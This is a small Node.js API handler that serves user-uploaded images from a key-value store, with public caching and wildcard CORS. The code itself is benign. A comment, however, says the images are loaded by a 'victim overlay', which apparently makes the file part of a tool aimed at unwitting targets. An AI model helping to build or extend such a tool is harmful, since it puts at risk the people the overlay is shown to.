// GET /api/custom/img?o=<uid>&id=<id> -> 이미지 바이트 (공개: 피해자 오버레이가 불러옴)
'use strict';
const { kvGet } = require('../_store');

module.exports = async (req, res) => {
  const url = new URL(req.url, 'http://x');
  const o = url.searchParams.get('o');
  const id = url.searchParams.get('id');
  if (!o || !id) { res.statusCode = 400; return res.end('bad'); }
  const rec = await kvGet(`sw:custimg:${o}:${id}`);
  if (!rec || !rec.data) { res.statusCode = 404; return res.end('not found'); }
  const buf = Buffer.from(rec.data, 'base64');
  res.statusCode = 200;
  res.setHeader('content-type', rec.mime || 'image/jpeg');
  res.setHeader('cache-control', 'public, max-age=86400');
  res.setHeader('access-control-allow-origin', '*');
  return res.end(buf);
};
